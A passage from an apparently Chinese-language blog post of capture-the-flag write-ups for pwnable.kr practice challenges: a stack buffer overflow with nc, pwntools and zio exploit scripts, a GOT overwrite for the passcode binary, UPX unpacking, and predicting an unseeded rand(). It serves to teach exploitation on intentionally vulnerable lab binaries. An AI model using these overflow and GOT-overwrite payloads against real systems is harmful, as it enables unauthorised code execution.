+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">    gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="0x02-深入分析"><a href="#0x02-深入分析" class="headerlink" title="0x02 深入分析"></a>0x02 深入分析</h4><blockquote>
+<ul>
+<li>可以看到这段程序有两个函数，一个主函数、一个func()</li>
+<li>主函数调用func(),并传入了一个参数<code>0xdeadbeef</code></li>
+<li>func()可以看到关键的两个地方，一个是<code>gets(overflowme);</code>、一个是<code>system(&quot;/bin/sh&quot;);</code></li>
+<li>可以看到当<code>key==0xcafebabe</code>时，可以获得一个shell,key是调用时传进来的参数，但是传的是0xdeadbeef，相等?不存在的</li>
+<li>但是可以用<code>栈溢出</code>将函数调用时入栈的参数覆盖掉，让key==0xcafebabe</li>
+</ul>
+</blockquote>
+<p>先用IDA打开看看吧</p>
+<div align="left"><br>    <img src="/resources/2018/2018-04-18-01.png" alt="IDA"><br></div>
+
+<blockquote>
+<ul>
+<li><code>cmp [ebp+arg_0],0CAFEBABEh</code>这句对应<code>if(key == 0xcafebabe)</code>,可以知道key存到了ebp+arg_0</li>
+<li>arg_0 = dword ptr 8;故key的地址为<code>ebp+8</code></li>
+<li><code>call gets</code>上面两句lea eax,[ebp+s]和mov [esp],eax是为了提高栈顶，为了接收gets()传进来的数据</li>
+<li>输入的数据从ebp+s,也就是<code>ebp-0x2c</code>开始存储。</li>
+</ul>
+</blockquote>
+<p>现在用GDB调试下，停在<code>cmp [ebp+arg_0],0CAFEBABEh</code>处，下图是寄存器和汇编截图</p>
+<div align="left"><br>    <img src="/resources/2018/2018-04-18-02.png" alt="GDB"><br></div>
+
+<p>下图是栈内数据的布局：</p>
+<div align="left"><br>    <img src="/resources/2018/2018-04-18-03.png" alt="GDB"><br></div>
+
+<p>EAX中存储的为输入数据的首地址<code>0xffffce9c</code>,栈地址<code>0xffffced0</code>处存储的是func()调用的时候传入的key<code>0xdeadbeef</code>,现在算算0xffffced0-0xffffce9c=0x34,也就是52个字节，在后面加上<code>0xcafebabe</code>就覆盖了key，成功跳转</p>
+<h4 id="0x03-构造并编写exp"><a href="#0x03-构造并编写exp" class="headerlink" title="0x03 构造并编写exp"></a>0x03 构造并编写exp</h4><p>系统只是调用了system函数，没有发现输入的话就会<code>终止</code>掉，所以我们可以向它传递一个标准输入：(cat -)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ⚙/pwn/pwnable.kr/bof (python -c &quot;print &apos;x&apos;*52 +&apos;\xbe\xba\xfe\xca&apos;&quot;)|nc pwnable.kr 9000 </span><br><span class="line">*** stack smashing detected ***: /home/bof/bof terminated</span><br><span class="line">overflow me :</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(python -c &quot;print &apos;x&apos;*52 +&apos;\xbe\xba\xfe\xca&apos;&quot;;cat -)|nc pwnable.kr 9000</span><br></pre></td></tr></table></figure>
+<p>这里若没有cat，因为nc的单向连接时<code>非持续性</code>的，那么传完payload后一个tcp会话就结束了，也就是没机会传cmd命令了，而加入cat，则让nc的这个tcp会话永不结束，直到用户输入Ctri+C。而cat又比较特殊，可以将用户输入原封不动返回并重定向给了nc…</p>
+<p>下面是用<code>pwntools</code>写的自动化攻击脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">52</span>+<span class="string">'\xbe\xba\xfe\xca'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+<p>下面是用<code>zio</code>写的自动化攻击脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">host = <span class="string">"pwnable.kr"</span></span><br><span class="line">port = <span class="number">9000</span></span><br><span class="line">io = zio((host,port),print_read=<span class="keyword">False</span>,print_write=<span class="keyword">False</span>)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">52</span> + <span class="string">"\xbe\xba\xfe\xca"</span> + <span class="string">"\n"</span></span><br><span class="line">io.write(payload+<span class="string">"\n"</span>)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><blockquote>
+<p><strong>题目描述：</strong><br>Papa brought me a packed present! let’s open it.<br>Download : <a href="http://pwnable.kr/bin/flag" target="_blank" rel="noopener">http://pwnable.kr/bin/flag</a><br>This is reversing task. all you need is binary</p>
+</blockquote>
+<h4 id="0x00-题目分析-3"><a href="#0x00-题目分析-3" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>题目说这是一个逆向的题目，将题目给的文件下载下来，先用IDA打开看一下</p>
+<div align="left"><br>    <img src="/resources/2018/2018-04-26-00.png" alt="IDA"><br></div>
+
+<p>可以看到这不是一个正常的情况，结合逆向的提示，估计是被加了壳，用strings查看flag文件，在最后发现了UPX，说明被加了<code>UPX壳</code>，用下面的命令进行脱壳</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx -d flag -o deflag</span><br></pre></td></tr></table></figure>
+<h4 id="0x01-获取flag"><a href="#0x01-获取flag" class="headerlink" title="0x01 获取flag"></a>0x01 获取flag</h4><p>然后将去壳的<code>deflag</code>再用IDA打开看一下，定位到main函数，可以看到<code>mov rdx, cs:flag</code></p>
+<div align="left"><br>    <img src="/resources/2018/2018-04-26-01.png" alt="IDA"><br></div>
+
+<p>双击flag，可以定位到这样一字符串（也可以用shift+F12,查看字符串）</p>
+<div align="left"><br>    <img src="/resources/2018/2018-04-26-02.png" alt="IDA"><br></div>
+
+<p>将这串字符串提交，通过了。可以看到这道题就是考了<code>脱壳</code>的知识点。</p>
+<h3 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h3><blockquote>
+<p><strong>题目描述：</strong><br>Mommy told me to make a passcode based login system.<br>My initial C code was compiled without any error!<br>Well, there was some compiler warning, but who cares about that?<br>ssh passcode@pwnable.kr -p2222 (pw:guest)</p>
+</blockquote>
+<h4 id="0x00-题目分析-4"><a href="#0x00-题目分析-4" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>依旧先登录一下</p>
+<div align="left"><br>    <img src="/resources/2018/2018-04-26-03.png" alt="ssh"><br></div>
+
+<p>可以看到当前目录下有三个文件，<code>flag</code>、<code>passcode</code>、<code>passcode.c</code>,当然了当前用户对flag肯定是没有读写权限的，所以查看一下passcode.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> passcode1;</span><br><span class="line">    <span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">    welcome();</span><br><span class="line">    login();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// something after login...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="0x01-深入分析"><a href="#0x01-深入分析" class="headerlink" title="0x01 深入分析"></a>0x01 深入分析</h4><blockquote>
+<ul>
+<li>可以看到main函数里调用了两个函数，<code>welcome()</code>和<code>login()</code></li>
+<li>welcome和login拥有相同的<code>ebp</code>，栈帧有交叉</li>
+<li>welcome()函数里接收了一个最大大小为100个字符的name字符串</li>
+<li>login()函数里接收了两个变量<code>passcode1</code>和<code>passcode2</code>,并且分别与<code>338150</code>和<code>13371337</code>进行比较</li>
+<li>如果都相等，则输出flag</li>
+<li>但是scanf()用的有问题，没有用&amp;取地址符号，如果scanf没加&amp;的话，程序会默认从栈中读取4个字节的数据当做scanf取的地址</li>
+<li>也就是说不能通过这两个scanf()突破限制，所以重任就落在了<code>name</code>的身上</li>
+</ul>
+</blockquote>
+<p>先看一下name、passcode1、passcode2在栈中的位置</p>
+<div align="left"><br>    <img src="/resources/2018/2018-04-27-00.png" alt="name"><br></div>
+
+<div align="left"><br>    <img src="/resources/2018/2018-04-27-01.png" alt="passcode"><br></div>
+
+<p>可以看到name在栈中的起始位置是<code>ebp-0x70</code>,passcode1和passcode2在栈中的位置分别为<code>ebp-0x10</code>、<code>ebp-0x0c</code>,(ebp-0x70)-(ebp-0x10)=96,由于程序给name分配了100个字节的空间，所以刚好可以覆盖到passcode1,但是由于开启了<code>canary</code>,所以不能再继续覆盖到passcode2，但是GOT表是可写的。因此，可以把passcode1的地址修改为fflush()或printf()或exit()的GOT表地址，然后通过scanf()传入system()的地址，将fflush()或printf()或exit()的真实地址覆盖，这样就拿到shell了。</p>
+<div align="left"><br>    <img src="/resources/2018/2018-04-27-02.png" alt="checksec"><br></div>
+
+<div align="left"><br>    <img src="/resources/2018/2018-04-27-03.png" alt="GOT表"><br></div>
+
+<div align="left"><br>    <img src="/resources/2018/2018-04-27-04.png" alt="system地址"><br></div>
+
+<h4 id="0x02-构造payload并编写exp"><a href="#0x02-构造payload并编写exp" class="headerlink" title="0x02 构造payload并编写exp"></a>0x02 构造payload并编写exp</h4><p>这里我用system的地址<code>覆盖fflush()</code>在GOT表中存的真实地址，因为scanf()以%d获取数据，所以system()的地址<code>0x80485e3</code>要转化成十进制数<code>134514147</code>,现在构造payload获取flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &apos;A&apos;*96+&apos;\x04\xa0\x04\x08&apos;+&apos;134514147\n&apos;&quot; | ./passcode</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./passcode'</span>)</span><br><span class="line"></span><br><span class="line">fflush_got = <span class="number">0x0804a004</span></span><br><span class="line">system_addr = <span class="number">0x080485e3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"A"</span>*<span class="number">96</span></span><br><span class="line">payload += p32(fflush_got)</span><br><span class="line">payload += str(system_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>
+<h4 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p>这道题涉及到的知识点是GOT表是可写的，scanf()如果没有加&amp;取地址符，就会在栈上取地址作为传入的数据的存放地址</p>
+<h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><blockquote>
+<p><strong>题目描述：</strong><br>Daddy, teach me how to use random value in programming!<br>ssh random@pwnable.kr -p2222 (pw:guest)</p>
+</blockquote>
+<h4 id="0x00-题目分析-5"><a href="#0x00-题目分析-5" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>从题目名称和题目描述可以看出，这道题和<code>随机数</code>有关系，先来链接一下靶机看看</p>
+<div align="left"><br>    <img src="/resources/2018/2018-04-28-00.png" alt="ssh"><br></div>
+
+<p>可以看到当前目录下有三个文件，<code>flag</code>、<code>random</code>、<code>random.c</code>,现在查看一下random.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">    random = rand();	<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="0x01-深入分析-1"><a href="#0x01-深入分析-1" class="headerlink" title="0x01 深入分析"></a>0x01 深入分析</h4><p>可以看到<code>random.c</code>使用了stdlib.h中的rand()函数，讲到rand()函数，就要说一下srand()函数，下面先介绍一下<code>rand()</code>函数和<code>srand()</code>函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*****************************rand()函数********************************</span><br><span class="line">函数原型：int rand(void)；</span><br><span class="line">返回值：返回一个[0，RAND_MAX]之间的随机整数</span><br><span class="line">说明：rand()函数产生的随机数并不是真正的随机数，是伪随机数，它会将srand()产生</span><br><span class="line">     的随机数种子作为随机数序列的初始值。如果每次的种子不同，就可以产生不同的随</span><br><span class="line">     机数序列。如果种子是相同的，产生的随机数序列也是相同的。若未设置随机数种子，</span><br><span class="line">     默认是随机数种子为1，这里就是这种情况</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">****************************srand()函数********************************</span><br><span class="line">函数原型：void srand(unsigned seed)；</span><br><span class="line">函数参数：参数seed就是设置的随机数种子</span><br><span class="line">说明：系统在调用rand()函数之前，会自动调用srand()，如果用户在rand()之前曾调用</span><br><span class="line">     过srand()给参数seed指定了一个值，那么 rand()就会将seed的值作为产生伪随机</span><br><span class="line">     数的初始值；而如果用户在rand()前没有调用过srand()，那么系统默认将1作为伪</span><br><span class="line">     随机数的初始 值。如果给了一个定值，那么每次rand()产生的随机数序列都是一样的~~</span><br></pre></td></tr></table></figure>
+<p>我们可以看到，random.c里用了<code>rand()</code>函数，但是没有对随机数种子进行设置，所以，每次运行这个程序的时候，产生的第一个随机数都是确定的。可以有好几种方法获得这个序列的第一个随机值，可以写一段代码将第一个随机数打印出来，也可以用调试器调试，看执行完rand()函数后，<code>rax</code>或者<code>eax</code>内的值，就是rand()函数的返回值.我用gdb查看rax的值，先在rand()函数后下一个断点，运行到断点出，可以看到rax的值如下图所示：(0x6b8b4567==1804289383)</p>
+<div align="left"><br>    <img src="/resources/2018/2018-04-28-01.png" alt="gdb"><br></div>
+
+<h4 id="0x02-获取flag"><a href="#0x02-获取flag" class="headerlink" title="0x02 获取flag"></a>0x02 获取flag</h4><blockquote>
+<ul>
+<li>当<code>if((key ^ random) == 0xdeadbeef)</code>成立时，会将flag显示出来</li>
+<li>random在上面已经得到了，<code>random=0x6b8b4567</code></li>
+<li>key是我们需要输入的，我们知道^(异或)运算是<code>可逆</code>的</li>
+<li>所以key=random^0xdeadbeef,<code>key=3039230856</code></li>
+</ul>
+</blockquote>
+<div align="left"><br>    <img src="/resources/2018/2018-04-28-02.png" alt="flag"><br></div>
+
+<h4 id="0x03-总结-1"><a href="#0x03-总结-1" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p>这道题的知识点是<code>rand()</code>函数，如果未用<code>srand()</code>设置随机数种子，则默认随机数种子为1，产生的随机数序列是确定的</p>
+<h2 id="Rookiss"><a href="#Rookiss" class="headerlink" title="[Rookiss]"></a>[Rookiss]</h2><h2 id="Grotesque"><a href="#Grotesque" class="headerlink" title="[Grotesque]"></a>[Grotesque]</h2><h2 id="Hacker’s-Secret"><a href="#Hacker’s-Secret" class="headerlink" title="[Hacker’s Secret]"></a>[Hacker’s Secret]</h2>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/03/23/pwnable.kr/">pwnable.kr</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Sp4n9x 的个人博客">Sp4n9x</a></p>
+        <p><span>发布时间:</span>2018-03-23, 00:00</p>
+        <p><span>最后更新:</span>2018-04-28, 14:03</p>
+        
+            <p>
+                <span>更新历史:</span><i class="fa fa-github"></i>
+                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2018-03-23.pwnable.kr.md" title="顺序查看文章各部分修改记录" target = "_blank">Blame</a>,
+                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2018-03-23.pwnable.kr.md" title="查看文章有关更新记录" target = "_blank">History</a><span class="raw">文本模式:</span><i class="fa fa-file-text-o"></i>
+                <a href="https://raw.githubusercontent.com/Sp4n9x/blog_backup/blob/master/_posts/2018-03-23.pwnable.kr.md" title="查看 & 下载文章 Markdown 原始文本" target = "_blank"> .md Raw</a>
+            </p>
+        
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/03/23/pwnable.kr/" title="pwnable.kr">http://sp4n9x.github.io/2018/03/23/pwnable.kr/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://sp4n9x.github.io/2018/03/23/pwnable.kr/　　作者: Sp4n9x" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+    
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2018/04/05/Pwn环境搭建-Ubuntu16.04/">
+                    Pwn环境搭建——Ubuntu16.04
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2018/01/27/MySQL宽字节注入/">
+                    MySQL宽字节注入
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+
+
+
+
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Toddler’s-Bottle"><span class="toc-text">[Toddler’s Bottle]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fd"><span class="toc-text">fd</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-题目分析"><span class="toc-text">0x00 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-查看文件及权限"><span class="toc-text">0x01 查看文件及权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-分析fd-c"><span class="toc-text">0x02 分析fd.c</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-拿取flag"><span class="toc-text">0x03 拿取flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#collision"><span class="toc-text">collision</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-题目分析-1"><span class="toc-text">0x00 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-查看文件权限"><span class="toc-text">0x01 查看文件权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-分析col-c"><span class="toc-text">0x02 分析col.c</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-拿取flag-1"><span class="toc-text">0x03 拿取flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bof"><span class="toc-text">bof</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-题目分析-2"><span class="toc-text">0x00 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-bof-amp-bof-c"><span class="toc-text">0x01 bof&amp;bof.c</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-深入分析"><span class="toc-text">0x02 深入分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-构造并编写exp"><span class="toc-text">0x03 构造并编写exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag"><span class="toc-text">flag</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-题目分析-3"><span class="toc-text">0x00 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-获取flag"><span class="toc-text">0x01 获取flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#passcode"><span class="toc-text">passcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-题目分析-4"><span class="toc-text">0x00 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-深入分析"><span class="toc-text">0x01 深入分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-构造payload并编写exp"><span class="toc-text">0x02 构造payload并编写exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-总结"><span class="toc-text">0x03 总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#random"><span class="toc-text">random</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-题目分析-5"><span class="toc-text">0x00 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-深入分析-1"><span class="toc-text">0x01 深入分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-获取flag"><span class="toc-text">0x02 获取flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-总结-1"><span class="toc-text">0x03 总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rookiss"><span class="toc-text">[Rookiss]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Grotesque"><span class="toc-text">[Grotesque]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hacker’s-Secret"><span class="toc-text">[Hacker’s Secret]</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
